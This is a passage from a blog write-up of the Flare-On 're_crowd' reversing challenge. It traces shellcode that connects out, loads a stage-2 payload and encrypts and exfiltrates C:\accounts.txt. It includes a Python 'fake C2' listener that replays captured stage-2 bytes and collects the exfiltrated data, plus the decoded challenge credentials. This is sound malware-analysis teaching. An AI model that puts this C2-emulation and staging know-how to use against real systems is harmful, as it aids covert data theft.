<p>Check that I’m using the option <strong><em>-esi base</em></strong> because the shellcode expect that this register hold his address, then we see that the shellcode is dynamic loading the library <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/">ws2_32</a>, aka winsock, (Using <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a>), this library hold all the socket code, functions like <strong><em>connect</em></strong> and <strong><em>recv</em></strong>, later on it will connect as expect to port 4444, receive some data, and use <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a> to allocate a portion of the memory that will be used for the stage2.</p>

<h2 id="the-fake-c2-code"><span class="mr-2">The fake C2 code</span><a href="#the-fake-c2-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>At this point I had an idea, can I write a fake C2 that emulate what the attacker does ? And was exactly what I did, I create a simple C2 server that will send the same packets when the shellcode try the reach, and receive the same data, this way I can see with my own eyes what really happened in the server.</p>

<p>Fake C2 code</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">socket</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="k">class</span> <span class="nc">C2</span><span class="p">:</span>
	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sender</span> <span class="o">=</span> <span class="bp">True</span><span class="p">):</span>
		<span class="n">self</span><span class="p">.</span><span class="n">sender</span> <span class="o">=</span> <span class="n">sender</span>
		<span class="n">self</span><span class="p">.</span><span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span>
		<span class="n">self</span><span class="p">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
		<span class="n">self</span><span class="p">.</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">()</span>
		<span class="n">self</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="n">self</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>
		<span class="n">self</span><span class="p">.</span><span class="n">bytes_to_send</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
	
	<span class="k">def</span> <span class="nf">set_host_data</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">data_path</span><span class="p">):</span>
		<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">data_path</span><span class="p">):</span>
			<span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sh">"</span><span class="s">Unable to find file {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">data_path</span><span class="p">))</span>
		
		<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Loading {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">data_path</span><span class="p">))</span>
		<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">data_path</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">data_fd</span><span class="p">:</span>
			<span class="n">self</span><span class="p">.</span><span class="n">bytes_to_send</span> <span class="o">=</span> <span class="n">data_fd</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
		
		<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Data loaded, ready to serve!</span><span class="sh">"</span><span class="p">);</span>


	<span class="k">def</span> <span class="nf">listen</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
		<span class="n">self</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Wainting connections at {}:{}...</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>

		<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
			<span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
			<span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">sender</span><span class="p">:</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Received connection, sending bytes...</span><span class="sh">"</span><span class="p">)</span>
				<span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">bytes_to_send</span><span class="p">)</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Bytes sent!, closing...</span><span class="sh">"</span><span class="p">)</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Received connection, waiting data...</span><span class="sh">"</span><span class="p">)</span>
				<span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
				<span class="n">save_file</span> <span class="o">=</span> <span class="sh">"</span><span class="s">dump.bin</span><span class="sh">"</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Received!, saving to {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">save_file</span><span class="p">))</span>
				<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">save_file</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">save</span><span class="p">:</span>
					<span class="n">save</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Saved</span><span class="sh">"</span><span class="p">)</span>


			<span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>





<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
	<span class="n">port</span>   <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
	<span class="n">file_to_server</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
	<span class="n">sender</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
	
	<span class="n">c2</span> <span class="o">=</span> <span class="nc">C2</span><span class="p">(</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sender</span> <span class="o">==</span> <span class="sh">"</span><span class="s">sender</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">c2</span><span class="p">.</span><span class="nf">set_host_data</span><span class="p">(</span><span class="n">file_to_server</span><span class="p">)</span>

	<span class="n">c2</span><span class="p">.</span><span class="nf">listen</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I also created an file with a random content at <strong><em>C:\accounts.txt</em></strong>, changed my local ip address to 192.168.68.21 and I ran again.</p>

<p><a href="/assets/images/re_crowd/scdbg_half_complet.png" class="popup img-link "><img data-src="/assets/images/re_crowd/scdbg_half_complet.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>Note that I added two more options in scdbg, -i for interactive mode, this will make some function access real resources, such ips, and -u to unlimited steps… but scdbg crashed because it don’t understand some opcodes,maybe some limitations of the libemu, the good part is that our fake c2 really worked, I was able to reply back the malicious packet and the shellcode really allocate and ran that, but this is not good enough, I need go deeper.</p>

<h1 id="debugging-shellcode-in-x64dbg">Debugging shellcode in x64dbg</h1>

<p>I will use x64dbg for debug this shellcode, the steps to acomplish that, is:</p>

<ul>
  <li>Get a real process</li>
  <li>Allocate memory</li>
  <li>Copy our shellcode inside the process</li>
  <li>Change EIP and fix ESI for the shellcode</li>
</ul>

<p><a href="/assets/images/re_crowd/x64dbg_session.png" class="popup img-link "><img data-src="/assets/images/re_crowd/x64dbg_session.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>Ok, now it’s debugging time, I will just point the key parts of this shellcode/stage2 because a lot happened here.</p>

<h2 id="the-first-jump"><span class="mr-2">The first jump</span><a href="#the-first-jump" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>After all the decode routine ends, the first <strong><em>jmp</em></strong> will be revealed</p>

<p><a href="/assets/images/re_crowd/loading_winsock.png" class="popup img-link "><img data-src="/assets/images/re_crowd/loading_winsock.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>Notice that the <strong><em>eax</em></strong> register actually holds the LoadLibrary address, and on the top of our stack we have the <strong><em>ws2_32</em></strong> library, you need follow this jump in order to not lose the control of the shellcode, until you reach a safe point that you can put a useful breakpoint.</p>

<p>After a while, I notice a lot of call functions to ebp register, so I just put some breaking points in a hope to find something useful in the call</p>

<p><a href="/assets/images/re_crowd/EBP_BREAKS.png" class="popup img-link "><img data-src="/assets/images/re_crowd/EBP_BREAKS.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>Following this calls, I found the Readfile function, after that I notice that my data was sent to a strange function that looks like a encryption routine, take a look</p>

<p><a href="/assets/images/re_crowd/intrepidmango.png" class="popup img-link "><img data-src="/assets/images/re_crowd/intrepidmango.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>Notice that ESP holds my file data and Yes, I just fill with a bunch of <strong><em>A</em></strong>, later on I realized that was a bad idea, In the next call it will load all the alphabet characters and starts it encoding/encryption routine of my data.</p>

<p><a href="/assets/images/re_crowd/encode_routine.png" class="popup img-link "><img data-src="/assets/images/re_crowd/encode_routine.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>You can see that the key is loaded and my data is in the stack with a bunch of <strong><em>0x41</em></strong>, the A’s before, It was a really bad idea fill with a unique byte… But, it really doesn’t matter, I already found the encryption loop, so I just need to analyze that, try to understand and write a decoder for th… no, please, just no.</p>

<h2 id="the-simple-idea-that-reveal-the-flag"><span class="mr-2">The simple idea that reveal the flag</span><a href="#the-simple-idea-that-reveal-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>So I don’t know if this was an act of miracle, or from where come this insight, but my idea was, what if I replace my <strong><em>C:\accounts.txt</em></strong> with the encoded/exfiltrated data ?</p>

<p>I literally did that, I dumped out the 1337 data from pcap and replace my <strong><em>C:\accounts</em></strong>, I literally just ran the shellcode and wait my fake C2 dump the file out.</p>

<p><a href="/assets/images/re_crowd/fakec2_final.png" class="popup img-link "><img data-src="/assets/images/re_crowd/fakec2_final.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>After ran the shellcode (x64dbg clean the screen after finish), my C2 that was listening on port <strong><em>1337</em></strong>, dumped something, and guess what ?</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>roy:h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com:goat &lt;---
moss:Pot-Pocket-Pigeon-Hunt-8:narwhal
jen:Straighten-Effective-Gift-Pity-1:bunny
richmond:Inventor-Hut-Autumn-Tray-6:bird
denholm:123:dog
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/images/re_crowd/never_give_up.png" class="popup img-link "><img data-src="/assets/images/re_crowd/never_give_up.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<h1 id="conclusion">Conclusion</h1>

<p>By the end of the write-up, you will notice the amount of steps that we acomplished:</p>

<ul>
  <li>Network analysis</li>
  <li>Threat analysis</li>
  <li>Shellcode analysis</li>
  <li>Data exfiltration decoding</li>
</ul>

<p>Thanks to all!</p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/reverse-engineering/'>Reverse-Engineering</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/network-analysis/"
          class="post-tag no-text-decoration" >Network analysis</a>
      
      <a href="/tags/shellcode-analysis/"
          class="post-tag no-text-decoration" >Shellcode analysis</a>
      
      <a href="/tags/programming/"
          class="post-tag no-text-decoration" >Programming</a>
      
      <a href="/tags/reverse-engineering/"
          class="post-tag no-text-decoration" >Reverse engineering</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Data%20exfiltration:%20From%20shellcode%20to%20flag%20-%20Reversing%20codes&url=https%3A%2F%2Freversing.codes%2Fposts%2FRetrieving-the-exfiltrated-flag-flareon7%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Data%20exfiltration:%20From%20shellcode%20to%20flag%20-%20Reversing%20codes&u=https%3A%2F%2Freversing.codes%2Fposts%2FRetrieving-the-exfiltrated-flag-flareon7%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=https%3A%2F%2Freversing.codes%2Fposts%2FRetrieving-the-exfiltrated-flag-flareon7%2F&text=Data%20exfiltration:%20From%20shellcode%20to%20flag%20-%20Reversing%20codes" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Recently Updated</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/PlayStation-5-ELF-Injection/">Usermode ELF injection on the PlayStation 5</a></li>
      
        
        
        
      <li><a href="/posts/ps4-kernel-patching-guide/">How to patch the running PlayStation 4 kernel</a></li>
      
        
        
        
      <li><a href="/posts/Stop-Using-GetProcAddress-And-Let-The-Linker/">Quick Tip: Stop Using GetProcAddress and Let the Linker Do the Job for You</a></li>
      
        
        
        
      <li><a href="/posts/Manual-unpacking-in-details/">Manual Unpacking in Details</a></li>
      
        
        
        
      <li><a href="/posts/Manipulating-elf-with-felf/">Manipulating elf files in C++ using felf</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/programming/">Programming</a>
    
      
      <a class="post-tag" href="/tags/reverse-engineering/">Reverse engineering</a>
    
      
      <a class="post-tag" href="/tags/malware-research/">Malware Research</a>
    
      
      <a class="post-tag" href="/tags/ctf/">ctf</a>
    
      
      <a class="post-tag" href="/tags/windows-internals/">Windows Internals</a>
    
      
      <a class="post-tag" href="/tags/freebsd/">FreeBSD</a>
    
      
      <a class="post-tag" href="/tags/malware-analysis/">Malware analysis</a>
    
      
      <a class="post-tag" href="/tags/malware-research/">Malware research</a>
    
      
      <a class="post-tag" href="/tags/network-analysis/">Network analysis</a>
    
      
      <a class="post-tag" href="/tags/obfuscation-analysis/">obfuscation analysis</a>
    

    </div>
  </div>


    </div>

    
      
      



  <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
    <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
    <nav id="toc"></nav>
  </div>

  <!-- toc.js will be loaded at medium priority -->
  <script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/VBA-Stomping-flare/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1603495416"
    data-df="ll"
    >
  Oct 23, 2020
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>VBA Stomping: The macro hidden in plain sight</h3>
            <div class="text-muted small">
              <p>
                





                At Flare-on 7th there was a very interesting malware analysis challenge that envolved a very unique hide technique for malicious Macros. This technique is called VBA Stomp, this works by hiding the...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/Manipulating-elf-with-felf/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1606759236"
    data-df="ll"
    >
  Nov 30, 2020
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Manipulating elf files in C++ using felf</h3>
            <div class="text-muted small">
              <p>
                





                A couple months ago I created felf, a library to parse ELF files into C++ structures, the reason for this was to have a way in C++ to work on ELF files using STL structures like vector, unordered m...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/PlayStation-5-ELF-Injection/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1756868400"
    data-df="ll"
    >
  Sep  3, 2025
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Usermode ELF injection on the PlayStation 5</h3>
            <div class="text-muted small">
              <p>
                





                ELF injection is crucial for developing complex homebrew applications, helping with debugging and instrumentation during security research, and specially for extending application capabilities, suc...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/VBA-Stomping-flare/" class="btn btn-outline-primary"
    prompt="Older">
    <p>VBA Stomping: The macro hidden in plain sight</p>
  </a>
  

  
  <a href="/posts/Manipulating-elf-with-felf/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Manipulating elf files in C++ using felf</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/programming/">Programming</a>
    
      
      <a class="post-tag" href="/tags/reverse-engineering/">Reverse engineering</a>
    
      
      <a class="post-tag" href="/tags/malware-research/">Malware Research</a>
    
      
      <a class="post-tag" href="/tags/ctf/">ctf</a>
    
      
      <a class="post-tag" href="/tags/windows-internals/">Windows Internals</a>
    
      
      <a class="post-tag" href="/tags/freebsd/">FreeBSD</a>
    
      
      <a class="post-tag" href="/tags/malware-analysis/">Malware analysis</a>
    
      
      <a class="post-tag" href="/tags/malware-research/">Malware research</a>
    
      
      <a class="post-tag" href="/tags/network-analysis/">Network analysis</a>
    
      
      <a class="post-tag" href="/tags/obfuscation-analysis/">obfuscation analysis</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          © 2025
          <a href="https://github.com/buzzer-re">Buzzer</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.
        </p>
      </div>
    </div>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!-- JS selector for site. -->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js"></script>





  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1.11.6/dayjs.min.js,npm/dayjs@1.11.6/locale/en.min.js,npm/dayjs@1.11.6/plugin/relativeTime.min.js,npm/dayjs@1.11.6/plugin/localizedFormat.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

